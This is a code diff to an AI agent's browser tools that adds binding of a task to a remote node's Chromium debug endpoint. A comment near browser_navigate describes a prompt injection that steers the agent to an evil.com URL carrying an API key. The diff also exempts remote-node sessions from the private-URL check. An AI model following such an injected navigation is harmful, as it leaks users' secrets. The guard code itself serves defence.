@@ -1070,6 +1070,7 @@ def _navigation_session_key(task_id: str, url: str) -> str:
       3. The URL resolves to a private/LAN/loopback address.
       4. A CDP override is not active (that path owns the whole session).
       5. Camofox mode is not active (Camofox is already local-only).
+      6. The task is not explicitly bound to a remote node browser.
 
     When all are true, returns ``f"{task_id}::local"`` so the hybrid-routing
     path spawns a local Chromium sidecar while the cloud session (if any)
@@ -1077,6 +1078,8 @@ def _navigation_session_key(task_id: str, url: str) -> str:
     """
     if task_id is None:
         task_id = "default"
+    if _current_browser_node(task_id):
+        return task_id
     if _get_cdp_override():
         return task_id
     if _is_camofox_mode():
@@ -1093,6 +1096,48 @@ def _navigation_session_key(task_id: str, url: str) -> str:
 def _is_local_sidecar_key(session_key: str) -> bool:
     """Return True when ``session_key`` is a hybrid-routing local sidecar."""
     return session_key.endswith(_LOCAL_SUFFIX)
+
+
+def _normalize_browser_task_id(task_id: Optional[str]) -> str:
+    return task_id or "default"
+
+
+def _task_root_id(task_id: str) -> str:
+    if _is_local_sidecar_key(task_id):
+        return task_id[: -len(_LOCAL_SUFFIX)]
+    return task_id
+
+
+def _current_browser_node(task_id: Optional[str]) -> Optional[str]:
+    task_key = _task_root_id(_normalize_browser_task_id(task_id))
+    with _cleanup_lock:
+        return _task_browser_nodes.get(task_key)
+
+
+def _bind_browser_node(task_id: Optional[str], node_id: Optional[str] = None) -> Optional[str]:
+    task_key = _task_root_id(_normalize_browser_task_id(task_id))
+    requested = (node_id or "").strip() or None
+    if requested == "local":
+        requested = None
+    with _cleanup_lock:
+        existing = _task_browser_nodes.get(task_key)
+        if requested and existing and requested != existing:
+            raise ValueError(
+                f"Browser task '{task_key}' is already bound to node '{existing}'. "
+                f"Start a new task_id to switch to node '{requested}'."
+            )
+        if requested and not existing:
+            _task_browser_nodes[task_key] = requested
+            return requested
+        return existing
+
+
+def _remote_browser_requested(task_id: Optional[str], node_id: Optional[str] = None) -> bool:
+    return bool((node_id or "").strip() or _current_browser_node(task_id))
+
+
+def _use_camofox_backend(task_id: Optional[str], node_id: Optional[str] = None) -> bool:
+    return _is_camofox_mode() and not _remote_browser_requested(task_id, node_id)
 
 
 def _last_session_key(task_id: str) -> str:
@@ -1159,7 +1204,7 @@ def _socket_safe_tmpdir() -> str:
 # cleanup_browser code paths — the key is opaque to those internals.
 #
 # Stores: session_name (always), bb_session_id + cdp_url (cloud mode only)
-_active_sessions: Dict[str, Dict[str, str]] = {}  # session_key -> {session_name, ...}
+_active_sessions: Dict[str, Dict[str, Any]] = {}  # session_key -> {session_name, ...}
 _recording_sessions: set = set()  # session_keys with active recordings
 
 # Tracks the most recent session_key used per task_id. Set by browser_navigate()
@@ -1168,6 +1213,10 @@ _recording_sessions: set = set()  # session_keys with active recordings
 # navigation.  Without this, a task that navigated to localhost on the local
 # sidecar would fall back to the cloud session on its next snapshot call.
 _last_active_session_key: Dict[str, str] = {}  # task_id -> session_key
+# Optional explicit remote-browser binding per task_id. When set, browser tools
+# reuse a CDP endpoint discovered from that remote node instead of the local
+# host's browser/cloud-provider routing.
+_task_browser_nodes: Dict[str, str] = {}  # bare task_id -> node_id
 _LOCAL_SUFFIX = "::local"
 
 # Flag to track if cleanup has been done
@@ -1239,6 +1288,7 @@ def _emergency_cleanup_all_sessions():
                 _active_sessions.clear()
                 _session_last_activity.clear()
                 _recording_sessions.clear()
+                _task_browser_nodes.clear()
 
     # Sweep orphans from other crashed hermes processes.  Safe even if we
     # never used the browser — uses owner_pid liveness to avoid reaping
@@ -1636,12 +1686,20 @@ BROWSER_TOOL_SCHEMAS = [
     },
 ]
 
+_BROWSER_NODE_ID_PROPERTY = {
+    "type": "string",
+    "description": "Optional remote node_id whose debug-enabled Chromium-family browser should back this browser task. After the first browser_navigate binds a task_id to a node, later browser tools on that task reuse the same node browser automatically.",
+}
+for _schema in BROWSER_TOOL_SCHEMAS:
+    _schema.setdefault("parameters", {}).setdefault("properties", {})
+    _schema["parameters"]["properties"].setdefault("node_id", dict(_BROWSER_NODE_ID_PROPERTY))
+
 
 # ============================================================================
 # Utility Functions
 # ============================================================================
 
-def _create_local_session(task_id: str) -> Dict[str, str]:
+def _create_local_session(task_id: str) -> Dict[str, Any]:
     import uuid
     session_name = f"h_{uuid.uuid4().hex[:10]}"
     logger.info("Created local browser session %s for task %s",
@@ -1654,7 +1712,7 @@ def _create_local_session(task_id: str) -> Dict[str, str]:
     }
 
 
-def _create_cdp_session(task_id: str, cdp_url: str) -> Dict[str, str]:
+def _create_cdp_session(task_id: str, cdp_url: str) -> Dict[str, Any]:
     """Create a session that connects to a user-supplied CDP endpoint."""
     import uuid
     session_name = f"cdp_{uuid.uuid4().hex[:10]}"
@@ -1668,7 +1726,29 @@ def _create_cdp_session(task_id: str, cdp_url: str) -> Dict[str, str]:
     }
 
 
-def _get_session_info(task_id: Optional[str] = None) -> Dict[str, str]:
+def _create_remote_node_browser_session(task_id: str, node_id: str) -> Dict[str, Any]:
+    """Create a CDP session backed by another Hermes node's browser."""
+    from tools.node_lib import node_browser_debug_status
+
+    status = node_browser_debug_status(node_id)
+    cdp_url = str(status.get("suggested_connect_url") or status.get("websocket_debugger_url") or "").strip()
+    if not status.get("listening") or not cdp_url:
+        detail = status.get("error") or "Remote node browser debug endpoint is not reachable"
+        raise RuntimeError(
+            f"Remote browser on node '{node_id}' is not ready. "
+            f"Launch or connect a Chromium-family browser with remote debugging first. {detail}"
+        )
+
+    session_info = _create_cdp_session(task_id, cdp_url)
+    session_info["node_id"] = node_id
+    session_info["features"] = {
+        **session_info.get("features", {}),
+        "remote_node_browser": True,
+    }
+    return session_info
+
+
+def _get_session_info(task_id: Optional[str] = None, node_id: Optional[str] = None) -> Dict[str, Any]:
     """
     Get or create session info for the given session key.
 
@@ -1707,8 +1787,11 @@ def _get_session_info(task_id: Optional[str] = None) -> Dict[str, str]:
     force_local = _is_local_sidecar_key(task_id)
 
     # Create session outside the lock (network call in cloud mode)
+    remote_node_id = _current_browser_node(_task_root_id(task_id))
     cdp_override = _get_cdp_override()
-    if cdp_override and not force_local:
+    if remote_node_id and not force_local:
+        session_info = _create_remote_node_browser_session(task_id, remote_node_id)
+    elif cdp_override and not force_local:
         session_info = _create_cdp_session(task_id, cdp_override)
     elif force_local:
         session_info = _create_local_session(task_id)
@@ -2306,17 +2389,24 @@ def _truncate_snapshot(snapshot_text: str, max_chars: int = 8000) -> str:
 # Browser Tool Functions
 # ============================================================================
 
-def browser_navigate(url: str, task_id: Optional[str] = None) -> str:
+def browser_navigate(url: str, task_id: Optional[str] = None, node_id: Optional[str] = None) -> str:
     """
     Navigate to a URL in the browser.
 
     Args:
         url: The URL to navigate to
         task_id: Task identifier for session isolation
+        node_id: Optional remote node_id whose browser should back this task
 
     Returns:
         JSON string with navigation result (includes stealth features info on first nav)
     """
+    try:
+        effective_task_id = _normalize_browser_task_id(task_id)
+        remote_node_id = _bind_browser_node(effective_task_id, node_id)
+    except ValueError as exc:
+        return json.dumps({"success": False, "error": str(exc)}, ensure_ascii=False)
+
     # Secret exfiltration protection — block URLs that embed API keys or
     # tokens in query parameters. A prompt injection could trick the agent
     # into navigating to https://evil.com/steal?key=sk-ant-... to exfil secrets.
@@ -2344,19 +2434,14 @@ def browser_navigate(url: str, task_id: Optional[str] = None) -> str:
     # provider) because the agent already has full local network access via
     # the terminal tool.  Also skipped when hybrid routing will auto-spawn a
     # local Chromium sidecar for this URL (cloud provider configured +
-    # private URL + ``browser.auto_local_for_private_urls`` enabled) — the
-    # cloud provider never sees the URL in that case.  Can also be opted
-    # out globally via ``browser.allow_private_urls`` in config.
-    effective_task_id = task_id or "default"
-    nav_session_key = _navigation_session_key(effective_task_id, url)
+    # private URL + ``browser.auto_local_for_private_urls`` enabled), or when
+    # the task is explicitly bound to a remote node browser.
+    nav_session_key = effective_task_id if remote_node_id else _navigation_session_key(effective_task_id, url)
     auto_local_this_nav = _is_local_sidecar_key(nav_session_key)
+    remote_browser_this_nav = bool(remote_node_id)
 
     # Always-blocked floor: cloud metadata / IMDS endpoints are denied
     # regardless of backend, hybrid routing, or allow_private_urls.
-    # There's no legitimate agent use case for navigating to
-    # 169.254.169.254 / metadata.google.internal / ECS task metadata
-    # via a browser, and routing those to a local Chromium sidecar
-    # on an EC2/GCP/Azure host exfiltrates IAM credentials (#16234).
     if not _is_local_backend() and _is_always_blocked_url(url):
         return json.dumps({
             "success": False,
@@ -2366,6 +2451,7 @@ def browser_navigate(url: str, task_id: Optional[str] = None) -> str:
     if (
         not _is_local_backend()
         and not auto_local_this_nav
+        and not remote_browser_this_nav
         and not _allow_private_urls()
         and not _is_safe_url(url)
     ):
@@ -2384,7 +2470,7 @@ def browser_navigate(url: str, task_id: Optional[str] = None) -> str:
         })
 
     # Camofox backend — delegate after safety checks pass
-    if _is_camofox_mode():
+    if _use_camofox_backend(effective_task_id, node_id):
         from tools.browser_camofox import camofox_navigate
         return camofox_navigate(url, task_id)
 
@@ -2395,6 +2481,13 @@ def browser_navigate(url: str, task_id: Optional[str] = None) -> str:
             "set browser.auto_local_for_private_urls: false to disable)",
             url,
             type(_get_cloud_provider()).__name__ if _get_cloud_provider() else "none",
+        )
+    elif remote_browser_this_nav:
+        logger.info(
+            "browser_navigate: routing %s to remote node browser %s for task %s",
+            url,
+            remote_node_id,
+            effective_task_id,
         )
 
     # Get session info to check if this is a new session
@@ -2443,6 +2536,7 @@ def browser_navigate(url: str, task_id: Optional[str] = None) -> str:
         if (
             not _is_local_backend()
             and not auto_local_this_nav
+            and not remote_browser_this_nav
             and not _allow_private_urls()
             and final_url and final_url != url and not _is_safe_url(final_url)
         ):
@@ -2517,7 +2611,8 @@ def browser_navigate(url: str, task_id: Optional[str] = None) -> str:
 def browser_snapshot(
     full: bool = False,
     task_id: Optional[str] = None,
-    user_task: Optional[str] = None
+    user_task: Optional[str] = None,
+    node_id: Optional[str] = None,
 ) -> str:
     """
     Get a text-based snapshot of the current page's accessibility tree.
@@ -2526,15 +2621,22 @@ def browser_snapshot(
         full: If True, return complete snapshot. If False, return compact view.
         task_id: Task identifier for session isolation
         user_task: The user's current task (for task-aware extraction)
+        node_id: Optional remote node_id whose browser should back this task
 
     Returns:
         JSON string with page snapshot
     """
-    if _is_camofox_mode():
+    try:
+        effective_task_id = _normalize_browser_task_id(task_id)
+        _bind_browser_node(effective_task_id, node_id)
+    except ValueError as exc:
+        return json.dumps({"success": False, "error": str(exc)}, ensure_ascii=False)
+
+    if _use_camofox_backend(effective_task_id, node_id):
         from tools.browser_camofox import camofox_snapshot
         return camofox_snapshot(full, task_id, user_task)
 
-    effective_task_id = _last_session_key(task_id or "default")
+    effective_task_id = _last_session_key(effective_task_id)
 
     # Build command args based on full flag
     args = []
@@ -2583,22 +2685,29 @@ def browser_snapshot(
         return json.dumps(_copy_fallback_warning(response, result), ensure_ascii=False)
 
 
-def browser_click(ref: str, task_id: Optional[str] = None) -> str:
+def browser_click(ref: str, task_id: Optional[str] = None, node_id: Optional[str] = None) -> str:
     """
     Click on an element.
 
     Args:
         ref: Element reference (e.g., "@e5")
         task_id: Task identifier for session isolation
+        node_id: Optional remote node_id whose browser should back this task
 
     Returns:
         JSON string with click result
     """
-    if _is_camofox_mode():
+    try:
+        effective_task_id = _normalize_browser_task_id(task_id)
+        _bind_browser_node(effective_task_id, node_id)
+    except ValueError as exc:
+        return json.dumps({"success": False, "error": str(exc)}, ensure_ascii=False)
+
+    if _use_camofox_backend(effective_task_id, node_id):
         from tools.browser_camofox import camofox_click
         return camofox_click(ref, task_id)
 
-    effective_task_id = _last_session_key(task_id or "default")
+    effective_task_id = _last_session_key(effective_task_id)
 
     # Ensure ref starts with @
     if not ref.startswith("@"):
@@ -2620,7 +2729,7 @@ def browser_click(ref: str, task_id: Optional[str] = None) -> str:
         return json.dumps(_copy_fallback_warning(response, result), ensure_ascii=False)
 
 
-def browser_type(ref: str, text: str, task_id: Optional[str] = None) -> str:
+def browser_type(ref: str, text: str, task_id: Optional[str] = None, node_id: Optional[str] = None) -> str:
     """
     Type text into an input field.
 
@@ -2628,15 +2737,22 @@ def browser_type(ref: str, text: str, task_id: Optional[str] = None) -> str:
         ref: Element reference (e.g., "@e3")
         text: Text to type
         task_id: Task identifier for session isolation
+        node_id: Optional remote node_id whose browser should back this task
 
     Returns:
         JSON string with type result
     """
-    if _is_camofox_mode():
+    try:
+        effective_task_id = _normalize_browser_task_id(task_id)
+        _bind_browser_node(effective_task_id, node_id)
+    except ValueError as exc:
+        return json.dumps({"success": False, "error": str(exc)}, ensure_ascii=False)
+
+    if _use_camofox_backend(effective_task_id, node_id):
         from tools.browser_camofox import camofox_type
         return camofox_type(ref, text, task_id)
 
-    effective_task_id = _last_session_key(task_id or "default")
+    effective_task_id = _last_session_key(effective_task_id)
 
     # Ensure ref starts with @
     if not ref.startswith("@"):
@@ -2660,17 +2776,24 @@ def browser_type(ref: str, text: str, task_id: Optional[str] = None) -> str:
         return json.dumps(_copy_fallback_warning(response, result), ensure_ascii=False)
 
 
-def browser_scroll(direction: str, task_id: Optional[str] = None) -> str:
+def browser_scroll(direction: str, task_id: Optional[str] = None, node_id: Optional[str] = None) -> str:
     """
     Scroll the page.
 
     Args:
         direction: "up" or "down"
         task_id: Task identifier for session isolation
+        node_id: Optional remote node_id whose browser should back this task
 
     Returns:
         JSON string with scroll result
     """
+    try:
+        effective_task_id = _normalize_browser_task_id(task_id)
+        _bind_browser_node(effective_task_id, node_id)
+    except ValueError as exc:
+        return json.dumps({"success": False, "error": str(exc)}, ensure_ascii=False)
+
     # Validate direction
     if direction not in {"up", "down"}:
         return json.dumps({
@@ -2683,7 +2806,7 @@ def browser_scroll(direction: str, task_id: Optional[str] = None) -> str:
     # ~500px is roughly half a viewport of travel.
     _SCROLL_PIXELS = 500
 
-    if _is_camofox_mode():
+    if _use_camofox_backend(effective_task_id, node_id):
         from tools.browser_camofox import camofox_scroll
         # Camofox REST API doesn't support pixel args; use repeated calls
         _SCROLL_REPEATS = 5
@@ -2692,7 +2815,7 @@ def browser_scroll(direction: str, task_id: Optional[str] = None) -> str:
             result = camofox_scroll(direction, task_id)
         return result
 
-    effective_task_id = _last_session_key(task_id or "default")
+    effective_task_id = _last_session_key(effective_task_id)
 
     result = _run_browser_command(effective_task_id, "scroll", [direction, str(_SCROLL_PIXELS)])
     if not result.get("success"):
@@ -2709,21 +2832,28 @@ def browser_scroll(direction: str, task_id: Optional[str] = None) -> str:
     return json.dumps(_copy_fallback_warning(response, result), ensure_ascii=False)
 
 
-def browser_back(task_id: Optional[str] = None) -> str:
+def browser_back(task_id: Optional[str] = None, node_id: Optional[str] = None) -> str:
     """
     Navigate back in browser history.
 
     Args:
         task_id: Task identifier for session isolation
+        node_id: Optional remote node_id whose browser should back this task
 
     Returns:
         JSON string with navigation result
     """
-    if _is_camofox_mode():
+    try:
+        effective_task_id = _normalize_browser_task_id(task_id)
+        _bind_browser_node(effective_task_id, node_id)
+    except ValueError as exc:
+        return json.dumps({"success": False, "error": str(exc)}, ensure_ascii=False)
+
+    if _use_camofox_backend(effective_task_id, node_id):
         from tools.browser_camofox import camofox_back
         return camofox_back(task_id)
 
-    effective_task_id = _last_session_key(task_id or "default")
+    effective_task_id = _last_session_key(effective_task_id)
     result = _run_browser_command(effective_task_id, "back", [])
 
     if result.get("success"):
@@ -2741,22 +2871,29 @@ def browser_back(task_id: Optional[str] = None) -> str:
         return json.dumps(_copy_fallback_warning(response, result), ensure_ascii=False)
 
 
-def browser_press(key: str, task_id: Optional[str] = None) -> str:
+def browser_press(key: str, task_id: Optional[str] = None, node_id: Optional[str] = None) -> str:
     """
     Press a keyboard key.
 
     Args:
         key: Key to press (e.g., "Enter", "Tab")
         task_id: Task identifier for session isolation
+        node_id: Optional remote node_id whose browser should back this task
 
     Returns:
         JSON string with key press result
     """
-    if _is_camofox_mode():
+    try:
+        effective_task_id = _normalize_browser_task_id(task_id)
+        _bind_browser_node(effective_task_id, node_id)
+    except ValueError as exc:
+        return json.dumps({"success": False, "error": str(exc)}, ensure_ascii=False)
+
+    if _use_camofox_backend(effective_task_id, node_id):
         from tools.browser_camofox import camofox_press
         return camofox_press(key, task_id)
 
-    effective_task_id = _last_session_key(task_id or "default")
+    effective_task_id = _last_session_key(effective_task_id)
     result = _run_browser_command(effective_task_id, "press", [key])
 
     if result.get("success"):
@@ -2776,7 +2913,12 @@ def browser_press(key: str, task_id: Optional[str] = None) -> str:
 
 
 
-def browser_console(clear: bool = False, expression: Optional[str] = None, task_id: Optional[str] = None) -> str:
+def browser_console(
+    clear: bool = False,
+    expression: Optional[str] = None,
+    task_id: Optional[str] = None,
+    node_id: Optional[str] = None,
+) -> str:
     """Get browser console messages and JavaScript errors, or evaluate JS in the page.
 
     When ``expression`` is provided, evaluates JavaScript in the page context
@@ -2787,20 +2929,27 @@ def browser_console(clear: bool = False, expression: Optional[str] = None, task_
         clear: If True, clear the message/error buffers after reading
         expression: JavaScript expression to evaluate in the page context
         task_id: Task identifier for session isolation
+        node_id: Optional remote node_id whose browser should back this task
 
     Returns:
         JSON string with console messages/errors, or eval result
     """
+    try:
+        effective_task_id = _normalize_browser_task_id(task_id)
+        _bind_browser_node(effective_task_id, node_id)
+    except ValueError as exc:
+        return json.dumps({"success": False, "error": str(exc)}, ensure_ascii=False)
+
     # --- JS evaluation mode ---
     if expression is not None:
-        return _browser_eval(expression, task_id)
+        return _browser_eval(expression, effective_task_id)
 
     # --- Console output mode (original behaviour) ---
-    if _is_camofox_mode():
+    if _use_camofox_backend(effective_task_id, node_id):
         from tools.browser_camofox import camofox_console
         return camofox_console(clear, task_id)
 
-    effective_task_id = _last_session_key(task_id or "default")
+    effective_task_id = _last_session_key(effective_task_id)
 
     console_args = ["--clear"] if clear else []
     error_args = ["--clear"] if clear else []
@@ -2840,10 +2989,10 @@ def browser_console(clear: bool = False, expression: Optional[str] = None, task_
 
 def _browser_eval(expression: str, task_id: Optional[str] = None) -> str:
     """Evaluate a JavaScript expression in the page context and return the result."""
-    if _is_camofox_mode():
+    if _use_camofox_backend(task_id):
         return _camofox_eval(expression, task_id)
 
-    effective_task_id = _last_session_key(task_id or "default")
+    effective_task_id = _last_session_key(_normalize_browser_task_id(task_id))
 
     # --- Fast path: route through the supervisor's persistent CDP WS ---------
     # When a CDPSupervisor is alive for this task_id, ``Runtime.evaluate`` runs
@@ -3027,21 +3176,28 @@ def _maybe_stop_recording(task_id: str):
             _recording_sessions.discard(task_id)
 
 
-def browser_get_images(task_id: Optional[str] = None) -> str:
+def browser_get_images(task_id: Optional[str] = None, node_id: Optional[str] = None) -> str:
     """
     Get all images on the current page.
 
     Args:
         task_id: Task identifier for session isolation
+        node_id: Optional remote node_id whose browser should back this task
 
     Returns:
         JSON string with list of images (src and alt)
     """
-    if _is_camofox_mode():
+    try:
+        effective_task_id = _normalize_browser_task_id(task_id)
+        _bind_browser_node(effective_task_id, node_id)
+    except ValueError as exc:
+        return json.dumps({"success": False, "error": str(exc)}, ensure_ascii=False)
+
+    if _use_camofox_backend(effective_task_id, node_id):
         from tools.browser_camofox import camofox_get_images
         return camofox_get_images(task_id)
 
-    effective_task_id = _last_session_key(task_id or "default")
+    effective_task_id = _last_session_key(effective_task_id)
 
     # Use eval to run JavaScript that extracts images
     js_code = """JSON.stringify(
@@ -3088,7 +3244,12 @@ def browser_get_images(task_id: Optional[str] = None) -> str:
         return json.dumps(_copy_fallback_warning(response, result), ensure_ascii=False)
 
 
-def browser_vision(question: str, annotate: bool = False, task_id: Optional[str] = None) -> Union[str, Dict[str, Any]]:
+def browser_vision(
+    question: str,
+    annotate: bool = False,
+    task_id: Optional[str] = None,
+    node_id: Optional[str] = None,
+) -> Union[str, Dict[str, Any]]:
     """
     Take a screenshot of the current page for visual inspection.
 
@@ -3106,12 +3267,19 @@ def browser_vision(question: str, annotate: bool = False, task_id: Optional[str]
         question: What you want to know about the page visually
         annotate: If True, overlay numbered [N] labels on interactive elements
         task_id: Task identifier for session isolation
+        node_id: Optional remote node_id whose browser should back this task
 
     Returns:
         A JSON string with vision analysis results and screenshot_path, or a
         multimodal tool-result envelope carrying the screenshot and metadata.
     """
-    if _is_camofox_mode():
+    try:
+        effective_task_id = _normalize_browser_task_id(task_id)
+        _bind_browser_node(effective_task_id, node_id)
+    except ValueError as exc:
+        return json.dumps({"success": False, "error": str(exc)}, ensure_ascii=False)
+
+    if _use_camofox_backend(effective_task_id, node_id):
         from tools.browser_camofox import camofox_vision
         return camofox_vision(question, annotate, task_id)
 
@@ -3120,7 +3288,7 @@ def browser_vision(question: str, annotate: bool = False, task_id: Optional[str]
     from hermes_constants import get_hermes_dir
     screenshots_dir = get_hermes_dir("cache/screenshots", "browser_screenshots")
     screenshot_path = screenshots_dir / f"browser_screenshot_{uuid_mod.uuid4().hex}.png"
-    effective_task_id = _last_session_key(task_id or "default")
+    effective_task_id = _last_session_key(effective_task_id)
 
     # Lightpanda has no graphical renderer — pre-route screenshots to Chrome
     # via the fallback helper instead of letting the normal path fail with a
@@ -3447,6 +3615,8 @@ def cleanup_browser(task_id: Optional[str] = None) -> None:
     # (i.e. not when we're only reaping a sidecar mid-task).
     if not _is_local_sidecar_key(task_id):
         _last_active_session_key.pop(bare_task_id, None)
+        with _cleanup_lock:
+            _task_browser_nodes.pop(bare_task_id, None)
 
 
 def _cleanup_single_browser_session(task_id: str) -> None:
@@ -3557,6 +3727,7 @@ def cleanup_all_browsers() -> None:
     _cached_chromium_installed = None
     _cached_browser_engine = None
     _browser_engine_resolved = False
+    _task_browser_nodes.clear()
 
 # ============================================================================
 # Requirements Check
@@ -3811,7 +3982,7 @@ registry.register(
     name="browser_navigate",
     toolset="browser",
     schema=_BROWSER_SCHEMA_MAP["browser_navigate"],
-    handler=lambda args, **kw: browser_navigate(url=args.get("url", ""), task_id=kw.get("task_id")),
+    handler=lambda args, **kw: browser_navigate(url=args.get("url", ""), task_id=kw.get("task_id"), node_id=args.get("node_id")),
     check_fn=check_browser_requirements,
     emoji="🌐",
 )
@@ -3820,7 +3991,7 @@ registry.register(
     toolset="browser",
     schema=_BROWSER_SCHEMA_MAP["browser_snapshot"],
     handler=lambda args, **kw: browser_snapshot(
-        full=args.get("full", False), task_id=kw.get("task_id"), user_task=kw.get("user_task")),
+        full=args.get("full", False), task_id=kw.get("task_id"), user_task=kw.get("user_task"), node_id=args.get("node_id")),
     check_fn=check_browser_requirements,
     emoji="📸",
 )
@@ -3828,7 +3999,7 @@ registry.register(
     name="browser_click",
     toolset="browser",
     schema=_BROWSER_SCHEMA_MAP["browser_click"],
-    handler=lambda args, **kw: browser_click(ref=args.get("ref", ""), task_id=kw.get("task_id")),
+    handler=lambda args, **kw: browser_click(ref=args.get("ref", ""), task_id=kw.get("task_id"), node_id=args.get("node_id")),
     check_fn=check_browser_requirements,
     emoji="👆",
 )
@@ -3836,7 +4007,7 @@ registry.register(
     name="browser_type",
     toolset="browser",
     schema=_BROWSER_SCHEMA_MAP["browser_type"],
-    handler=lambda args, **kw: browser_type(ref=args.get("ref", ""), text=args.get("text", ""), task_id=kw.get("task_id")),
+    handler=lambda args, **kw: browser_type(ref=args.get("ref", ""), text=args.get("text", ""), task_id=kw.get("task_id"), node_id=args.get("node_id")),
     check_fn=check_browser_requirements,
     emoji="⌨️",
 )
@@ -3844,7 +4015,7 @@ registry.register(
     name="browser_scroll",
     toolset="browser",
     schema=_BROWSER_SCHEMA_MAP["browser_scroll"],
-    handler=lambda args, **kw: browser_scroll(direction=args.get("direction", "down"), task_id=kw.get("task_id")),
+    handler=lambda args, **kw: browser_scroll(direction=args.get("direction", "down"), task_id=kw.get("task_id"), node_id=args.get("node_id")),
     check_fn=check_browser_requirements,
     emoji="📜",
 )
@@ -3852,7 +4023,7 @@ registry.register(
     name="browser_back",
     toolset="browser",
     schema=_BROWSER_SCHEMA_MAP["browser_back"],
-    handler=lambda args, **kw: browser_back(task_id=kw.get("task_id")),
+    handler=lambda args, **kw: browser_back(task_id=kw.get("task_id"), node_id=args.get("node_id")),
     check_fn=check_browser_requirements,
     emoji="◀️",
 )
@@ -3860,7 +4031,7 @@ registry.register(
     name="browser_press",
     toolset="browser",
     schema=_BROWSER_SCHEMA_MAP["browser_press"],
-    handler=lambda args, **kw: browser_press(key=args.get("key", ""), task_id=kw.get("task_id")),
+    handler=lambda args, **kw: browser_press(key=args.get("key", ""), task_id=kw.get("task_id"), node_id=args.get("node_id")),
     check_fn=check_browser_requirements,
     emoji="⌨️",
 )
@@ -3869,7 +4040,7 @@ registry.register(
     name="browser_get_images",
     toolset="browser",
     schema=_BROWSER_SCHEMA_MAP["browser_get_images"],
-    handler=lambda args, **kw: browser_get_images(task_id=kw.get("task_id")),
+    handler=lambda args, **kw: browser_get_images(task_id=kw.get("task_id"), node_id=args.get("node_id")),
     check_fn=check_browser_requirements,
     emoji="🖼️",
 )
@@ -3877,7 +4048,7 @@ registry.register(
     name="browser_vision",
     toolset="browser",
     schema=_BROWSER_SCHEMA_MAP["browser_vision"],
-    handler=lambda args, **kw: browser_vision(question=args.get("question", ""), annotate=args.get("annotate", False), task_id=kw.get("task_id")),
+    handler=lambda args, **kw: browser_vision(question=args.get("question", ""), annotate=args.get("annotate", False), task_id=kw.get("task_id"), node_id=args.get("node_id")),
     check_fn=check_browser_vision_requirements,
     emoji="👁️",
 )
@@ -3885,7 +4056,7 @@ registry.register(
     name="browser_console",
     toolset="browser",
     schema=_BROWSER_SCHEMA_MAP["browser_console"],
-    handler=lambda args, **kw: browser_console(clear=args.get("clear", False), expression=args.get("expression"), task_id=kw.get("task_id")),
+    handler=lambda args, **kw: browser_console(clear=args.get("clear", False), expression=args.get("expression"), task_id=kw.get("task_id"), node_id=args.get("node_id")),
     check_fn=check_browser_requirements,
     emoji="🖥️",
 )
